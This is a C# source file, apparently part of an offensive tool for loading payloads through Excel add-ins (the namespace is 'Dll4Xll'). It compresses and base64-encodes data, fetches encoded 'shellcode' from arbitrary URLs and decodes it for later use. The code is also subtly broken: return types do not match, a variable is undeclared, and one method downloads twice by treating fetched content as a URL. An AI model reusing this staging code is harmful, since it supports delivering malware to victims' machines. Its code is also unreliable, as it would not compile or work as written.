using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;

namespace Dll4Xll
{
    public class SkavenCode
    {
        public static void CompressAndEncode(string inputFile, string outputFile)
        {
            byte[] inputBytes;
            using (var inputStream = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
            {
                inputBytes = new byte[inputStream.Length];
                inputStream.Read(inputBytes, 0, (int)inputStream.Length);
            }
            // Compress the input bytes
            byte[] compressedBytes = Compress(inputBytes);
            // Encode the compressed bytes in base64
            string encodedString = Convert.ToBase64String(compressedBytes);
            // Write the encoded string to the output file
            using (var outputStream = new StreamWriter(outputFile))
            {
                outputStream.Write(encodedString);
            }
        }

        public static byte[] CompressAndEncodeData(string inputData)
        {
            byte[] inputBytes = Encoding.UTF8.GetBytes(inputData);
            // Compress the input bytes
            byte[] compressedBytes = Compress(inputBytes);
            // Encode the compressed bytes in base64
            string encodedString = Convert.ToBase64String(compressedBytes);
            return encodedString;
        }

        public static byte[] CompressAndEncodeDataUrl(string url)
        {
            byte[] inputBytes;
            using (var client = new WebClient())
            {
                inputBytes = client.DownloadData(url);
            }      
            // Compress the input bytes
            byte[] compressedBytes = Compress(inputBytes);
            // Encode the compressed bytes in base64
            string encodedString = Convert.ToBase64String(compressedBytes);
            return encodedString;
        }



        public static void DecodeAndDecompress(string inputFile, string outputFile)
        {
            using (FileStream inputStream = new FileStream(inputFile, FileMode.Open))
            using (FileStream outputStream = new FileStream(outputFile, FileMode.Create))
            using (GZipStream decompressionStream = new GZipStream(inputStream, CompressionMode.Decompress))
            {
                byte[] buffer = new byte[1024 * 4];
                int read;
                while ((read = decompressionStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    outputStream.Write(buffer, 0, read);
                }
            }
        }

        public static byte[] DecodeAndDecompressUrl(string url)
        {
            byte[] shellcode;
            using (WebClient client = new WebClient())
            {
                string encodedShellcode = client.DownloadString(url);
                byte[] decodedBytes = SkavenCode.DecodeFromBase64Url(encodedShellcode);
                using (MemoryStream inputStream = new MemoryStream(decodedBytes))
                using (MemoryStream outputStream = new MemoryStream())
                using (GZipStream decompressionStream = new GZipStream(inputStream, CompressionMode.Decompress))
                {
                    byte[] buffer = new byte[1024 * 4];
                    int read;
                    while ((read = decompressionStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        outputStream.Write(buffer, 0, read);
                    }
                    shellcode = outputStream.ToArray();
                }
            }
            return shellcode;
        }

        // Changes here to return value, storing as input bytes and returning
        public static byte[] Compress(byte[] inputBytes)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                using (GZipStream compressionStream = new GZipStream(ms, CompressionMode.Compress))
                {
                    compressionStream.Write(inputBytes, 0, inputBytes.Length);
                }
                inputBytes = ms.ToArray();
            }
            return inputBytes;
        }

        // Changed return to "decompressed"
        public static byte[] Decompress(byte[] inputBytes)
        {
            using (MemoryStream ms = new MemoryStream(inputBytes))
            {
                using (GZipStream decompressionStream = new GZipStream(ms, CompressionMode.Decompress))
                {
                    using (MemoryStream outputStream = new MemoryStream())
                    {
                        decompressionStream.CopyTo(outputStream);
                        decompressed = outputStream.ToArray();
                    }
                }
            }
            return decompressed;
        }

        // Should make these "EncodeToBase64File" to differentiate from Url
        public static void EncodeToBase64(string inputFile, string outputFile)
        {
            byte[] inputBytes = File.ReadAllBytes(inputFile);
            string base64Encoded = Convert.ToBase64String(inputBytes);
            File.WriteAllText(outputFile, base64Encoded);
        }

        public static void EncodeToBase64Url(string url)
        {
            using (WebClient client = new WebClient())
            {
                string String = client.DownloadString(url);
                byte[] inputBytes = Convert.ToBase64String(String);
                return inputBytes;
            }
        }



        public static void DecodeFromBase64(string inputFile, string outputFile)
        {
            string base64String = File.ReadAllText(inputFile);
            byte[] decodedBytes = Convert.FromBase64String(base64String);
            File.WriteAllBytes(outputFile, decodedBytes);
        }

        public static byte[] DecodeFromBase64Url(string url)
        {
            using (WebClient client = new WebClient())
            {
                string base64String = client.DownloadString(url);
                byte[] inputBytes = Convert.FromBase64String(base64String);
                return inputBytes;
            }
        }

    }
}


